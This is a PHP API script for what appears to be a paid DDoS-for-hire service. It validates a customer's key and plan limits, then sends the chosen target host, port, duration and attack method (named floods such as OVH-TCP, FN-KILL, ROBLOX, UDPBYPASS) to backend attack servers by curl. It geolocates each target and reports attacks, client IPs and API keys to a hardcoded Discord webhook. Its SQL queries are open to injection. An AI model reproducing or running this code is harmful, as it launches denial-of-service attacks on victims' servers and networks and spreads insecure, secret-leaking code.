<title><?php echo htmlspecialchars($sitename); ?></title>
  <?php error_reporting (E_ALL ^ E_NOTICE); ?>
<?php
  ini_set('display_errors', 1);
require_once '../Class/config.php';
require_once '../Class/init.php';




if (!(empty($maintaince))) {
  die($maintaince);
}
  

if(isset($_GET['key']))
{
  if(!empty($_GET['key']))
  {
    // Store the key into a variable
    $key = $_GET['key'];
    
    // Fetch the user who owns the key specified
    $FetchUserSQL = $odb -> prepare("SELECT * FROM `users` WHERE `apikey` = ?");
    $FetchUserSQL -> execute(array($key));
    $FetchedUser = $FetchUserSQL -> fetch(PDO::FETCH_ASSOC);
    
    if($FetchedUser){
      $checkprior = $odb->prepare("SELECT COUNT(*) FROM logs WHERE user = ? AND `date` > ?");
      $checkprior->execute(array($FetchedUser['username'], time() - 600));
      if($checkprior->fetchColumn() > 5){
        die('You have been timed out for 10 minutes. for attempting to spam.');
      }

      
        $SQLGetApiEnabled = $odb -> prepare("SELECT `plans`.`apiaccess` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
        $SQLGetApiEnabled -> execute(array(':key' => $key));
        $apiEnabled = $SQLGetApiEnabled -> fetchColumn(0);
      if($apiEnabled == 1){

      $host = $_GET['host'];
      $port = intval($_GET['port']);
      $time = intval($_GET['time']);
      $method = $_GET['method'];
      $username = $_GET['username'];
      
      
      if(empty($host) || empty($port) || empty($time) || empty($method) || empty($username))
      {
        die('All fields are empty.');
      }
      $SQL = $odb -> prepare("SELECT * FROM users WHERE username = :username");
$SQL -> execute(array(':username' => $username));
$count = $SQL -> fetchColumn(0);
if($count < 1){
  die('Please enter a (vaild) username');
};

      $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = '$host' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
          $SQL -> execute(array());
          $countRunningH = $SQL -> fetchColumn(0);
          if ($countRunningH == 1) {

            die('There is currently an ongoing attack on this (IP Address).');
          }

                  //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
        $SQL -> execute(array(':method' => $method));
        $type = $SQL -> fetchColumn(0);
        if ($type == '4' || $type == '5' || $type == '6') {
            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host is not a valid URL.'));
            }
            $parameters = array(
                ".gov",
                "$",
                "{",
                ".edu",
                "%",
                "<"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
                    die('<div class="alert alert-info">You are not allowed to attack these kind of websites!</div>');
                }
            }
        } 
        //Check if host is blacklisted
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host AND `type` = 'victim'");
        $SQL -> execute(array(':host' => $host));
        $countBlacklist = $SQL -> fetchColumn(0);
        if ($countBlacklist > 0) {
            die(error('This host has been blacklisted'));
        }



//check conc limit
//Check open slots
    if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
      die('Currently all servers are at 100% network load, try later.');
    }
    //Check if the system is API
    if ($system == 'api') {
        //Check rotation
        $i            = 0;
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
    $SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
      $count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $i++;
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
        '[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
        $method
            );
            $APILink      = $show['api'];
            $handler[]    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
        if ($i == 0) {
          die('Currently all servers are at 100% network load, try later.');
        }
    }

    
$SQLCHECKMethods = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = ?");
$SQLCHECKMethods -> execute(array($method));
$countMethods = $SQLCHECKMethods -> fetchColumn(0);

                if($countMethods > 0){
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host' AND `type` = 'victim'");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);

        if ($time > 1200 && $method == "DNS") 
        {
                       die('Max time is 1200 seconds');
          die();
        }
        if ($time > 200 && $method == "OVH-TCP") 
        {
                       die('Max time is 200 seconds');
          die();
        }
        if ($time > 200 && $method == "NFO-TCP") 
        {
                       die('Max time is 200 seconds');
          die();
        }
        if ($time > 200 && $method == "OVH-UDP") 
        {
                       die('Max time is 200 seconds');
          die();
        }
        if ($time > 200 && $method == "GAME") 
        {
                       die('Max time is 200 seconds');
          die();
        }
        if ($time > 200 && $method == "FN-KILL") 
        {
                       die('Max time is 200 seconds');
          die();
        }
		if ($time > 200 && $method == "R6-15") 
        {
                       die('Max time is 200 seconds');
          die();
        }
		if ($time > 200 && $method == "FIVEM") 
        {
                       die('Max time is 200 seconds');
          die();
        }
		if ($time > 200 && $method == "HTTPS") 
        {
                       die('Max time is 200 seconds');
          die();
        }
		if ($time > 200 && $method == "UDPBYPASS") 
        {
                       die('Max time is 200 seconds');
          die();
        }
		if ($time > 200 && $method == "ROBLOX") 
        {
                       die('Max time is 200 seconds');
          die();
        }
        $checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
        $checkRunningSQL -> execute(array(':username' => $FetchedUser['username']));
        $countRunning = $checkRunningSQL -> fetchColumn(0);
                
        $SQLGetConcurrent = $odb -> prepare("SELECT `plans`.`concurrents` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
        $SQLGetConcurrent -> execute(array(':key' => $key));
        $userConcurrent = $SQLGetConcurrent -> fetchColumn(0);
        
        if($countRunning < $userConcurrent)
        {
          $SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
          $SQLGetTime -> execute(array(':key' => $key));
          $maxTime = $SQLGetTime -> fetchColumn(0);
          if(!($time > $maxTime))
          {
              $getServer = $odb -> prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
              $getServer -> execute(array(':method' => "%{$method}%"));
              $serverFetched = $getServer -> fetch(PDO::FETCH_ASSOC);

              $getServerName = $odb -> prepare("SELECT `name` FROM `methods` ORDER BY RAND() LIMIT 1");
              $getServerName -> execute();
              $serverName = $getServerName -> fetchColumn(0);
                                                        
              {
                                                                    //Rotation
                                                                    $urlnigga = $serverFetched['api'];
                                                                    $arrayFind = array('[host]', '[port]', '[time]', '[method]');
                                                                    $arrayReplace = array($host, $port, $time, $method);
                                                                    for($i = 0; $i < count($arrayFind); $i++)
                                                                    $urlnigga = str_replace($arrayFind[$i], $arrayReplace[$i], $urlnigga);
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $urlnigga);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
                                                                    curl_exec($ch);
                                                                    $lookupHost = str_replace("https://", "",$h);
				  $user = $FetchedUser['username'];
$serverNameLog .= $serverFetched['name'];
$lookupHost = str_replace("http://", "", $lookupHost);
$lookupHost = str_replace("/", "", $lookupHost);
$json = file_get_contents("http://ip-api.com/json/$host");

$data = json_decode($json, true);

//$ip = get_ip_address(); Function is lower below

$date = date('d/m/Y h:i:s');

$country = $data['country'];
$isp = $data['isp'];
$region = $data['region'];
$countryCode = $data['countryCode']; 
$regionName = $data['regionName'];
$city = $data['city'];
$zip = $data['zip'];
$timezone = $data['timezone'];
$org = $data['org'];
$as = $data['as'];

function get_ip_address()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validate_ip($ip))
                    return $ip;
            }
        } else {
            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];
    return $_SERVER['REMOTE_ADDR'];
}

function ip_in_range($ip, $range) {
    if (strpos($range, '/') == false)
        $range .= '/32';

    list($range, $netmask) = explode('/', $range, 2);
    $range_decimal = ip2long($range);
    $ip_decimal = ip2long($ip);
    $wildcard_decimal = pow(2, (32 - $netmask)) - 1;
    $netmask_decimal = ~ $wildcard_decimal;
    return (($ip_decimal & $netmask_decimal) == ($range_decimal & $netmask_decimal));
}

function _cloudflare_CheckIP($ip) {
    $cf_ips = array(
        '199.27.128.0/21',
        '173.245.48.0/20',
        '103.21.244.0/22',
        '103.22.200.0/22',
        '103.31.4.0/22',
        '141.101.64.0/18',
        '108.162.192.0/18',
        '190.93.240.0/20',
        '188.114.96.0/20',
        '197.234.240.0/22',
        '198.41.128.0/17',
        '162.158.0.0/15',
        '104.16.0.0/12',
    );
    $is_cf_ip = false;
    foreach ($cf_ips as $cf_ip) {
        if (ip_in_range($ip, $cf_ip)) {
            $is_cf_ip = true;
            break;
        }
    } return $is_cf_ip;
}

function _cloudflare_Requests_Check() {
    $flag = true;

    if(!isset($_SERVER['HTTP_CF_CONNECTING_IP']))   $flag = false;
    if(!isset($_SERVER['HTTP_CF_IPCOUNTRY']))       $flag = false;
    if(!isset($_SERVER['HTTP_CF_RAY']))             $flag = false;
    if(!isset($_SERVER['HTTP_CF_VISITOR']))         $flag = false;
    return $flag;
}

function isCloudflare() {
    $ipCheck        = _cloudflare_CheckIP($_SERVER['REMOTE_ADDR']);
    $requestCheck   = _cloudflare_Requests_Check();
    return ($ipCheck && $requestCheck);
}

function getRequestIP() {
    $check = isCloudflare();

    if($check) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function validate_ip($ip)

{

    if (strtolower($ip) === 'unknown')

        return false;

    $ip = ip2long($ip);

    if ($ip !== false && $ip !== -1) {

        $ip = sprintf('%u', $ip);

        if ($ip >= 0 && $ip <= 50331647)

            return false;

        if ($ip >= 167772160 && $ip <= 184549375)

            return false;

        if ($ip >= 2130706432 && $ip <= 2147483647)

            return false;

        if ($ip >= 2851995648 && $ip <= 2852061183)

            return false;

        if ($ip >= 2886729728 && $ip <= 2887778303)

            return false;

        if ($ip >= 3221225984 && $ip <= 3221226239)

            return false;

        if ($ip >= 3232235520 && $ip <= 3232301055)

            return false;

        if ($ip >= 4294967040)

            return false;

    }

    return true;

}
$ip = get_ip_address();

//=======================================================================================================

// Create new webhook in your Discord channel settings and copy&paste URL

//=======================================================================================================



$webhookurl = "https://discord.com/api/webhooks/994628137830846566/zFKw7jqDKfHUKcuJmSZkFeZG84V0t41rI2iEgROwMo4BtHFyVm8I2DrB8-LfLyWRQJjU";



//=======================================================================================================

// Compose message. You can use Markdown

// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting

//========================================================================================================



$timestamp = date("c", strtotime("now"));


$ixp = getRequestIP();
$json_data = json_encode([

    // Message

    "content" => "**Requesting IP**: `$ixp`",

    

    // Username

    "username" => "$nameofthesite",



    // Avatar URL.

    // Uncoment to replace image set in webhook

    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",



    // Text-to-speech

    "tts" => false,



    // File upload

    // "file" => "",



    // Embeds Array

    "embeds" => [

        [

            // Embed Title

            "title" => "Key: $key",



            // Embed Type

            "type" => "rich",



            // Embed Description

            //"description" => "**IP**:/n `$h`",



            // URL of title link

            "url" => "sitehere/client/api.php?key=$key&host=$host&port=$port&time=$time&method=$method",



            // Timestamp of embed must be formatted as ISO8601

            "timestamp" => $timestamp,



            // Embed left border color in HEX

            "color" => hexdec( "4EADAD" ),



            // Footer

            "footer" => [

                "text" => "$nameofthesite",

                "icon_url" => "logohere"

            ],



            // Image to send

            "image" => [

                "url" => "https://cdn.discordapp.com/attachments/912464952588120124/918254007477207130/Eclipse.png?size=400"

            ],



            // Thumbnail

            //"thumbnail" => [

            //    "url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=400"

            //],



            // Author

            "author" => [

                "name" => "$nameofthesite",

                "url" => ""

            ],



            // Additional Fields array

            "fields" => [

                // Field 1

                [
                    "name" => "**IP:**",
                    
                    "value" => "`$host`",
                    
                    "inline" => false
                ],
                
                [

                    "name" => "**Port:**",

                    "value" => "`$port`",

                    "inline" => false

                ],

                [
                    "name" => "**Time:**",
                    
                    "value" => "`$time`",
                    "inline" => false
                
                ],

                [

                    "name" => "**Method:**",

                    "value" => "`$method`",

                    "inline" => false

                ],
        
        [

                    "name" => "**UserName:**",

                    "value" => "`$user`",

                    "inline" => false

                ],
        
        [

                    "name" => "**Server Name:**",

                    "value" => "$serverNameLog",

                    "inline" => false

                ],
                
                
                [
                    "name" => "UserAgent:",
                    
                    "value" => "`Fixingstill`",
                    
                    "inline" => false
                ],

                [

                    "name" => "**IP Info:**",

                    "value" => "ISP: `$isp`\nCountry: `$country`\nRegion: `$region`\nCountry Code: `$countryCode`\nRegion Name: `$regionName`\nCity: `$city`\nZip: `$zip`\nTimezone: `$timezone`\nOrg: `$org`\nASN: `$as`\n",

                    "inline" => false

                ],

                [

                  "name" => "**Servers Responce To $host**",

                  "value" => "Sent 8/8 Servers",

                  "inline" => false
              ]

            ]

        ]

    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );



/*Tuna Section*/
// API URL

// Create a new cURL resource
$ch = curl_init($webhookurl);

// Attach encoded JSON string to the POST fields
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);

// Set the content type to application/json
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));

// Return response instead of outputting
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the POST request
$result = curl_exec($ch);

// Close cURL resource
curl_close($ch);
$responseTuna = json_decode($result, true);
/*Tuna Section*/ 
                                                                        
// $serverNameLog .= $serverFetched['name']; 
                                                                    $good = 1;

                                                            }
                                                            if($good == 1)
                                                            {

    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $FetchedUser['username'],
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $serverNameLog
    ));
                                
                     $SQL = $odb -> query("SELECT COUNT(*) FROM `logs` WHERE `user` = '" . $_SESSION['username'] . "'");
                     $total_my_attacks = intval($SQL->fetchColumn(0));
                     
                     $SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `date` > :date AND `user` = :username"); 
                     $SQL -> execute(array(":date" => $onedayago, ":username" => $_SESSION['username'])); 
                     $my_attacks_today = $SQL->fetchColumn(0);	

                     $SQL = $odb -> query("SELECT COUNT(*) FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `user` = '" . $_SESSION['username'] . "'");
                     $my_running_attacks = intval($SQL->fetchColumn(0));

                     
    echo('Attack Sent Details Below: <br><strong>Client: </strong>' .$username.'<br><strong>Target: </strong>' .$host.'<br><strong>Port: </strong>' .$port.'<br><strong>Method: </strong>' .$method.'<br><strong>Server: </strong> ' .$serverNameLog); 

              exit();
            }
          }
          else
  {
    die('"Your Max time is: '.$maxTime.'"');
  }
        }
        else
        {
        
          die('You have no more concurrents left, Please wait for the remaining attacks to complete.');
        }

      }
      else
      {

        die('This Method seems to be not correct or does not exist.');
      }
    }
    else
    {
      die('You have no Memebership.');
    }
    }
    else
    {
      die('Key inputed seems to be incorrect.');
    }
  }
  else
  {
    die('No key specified');
  }
}
?>         
</body>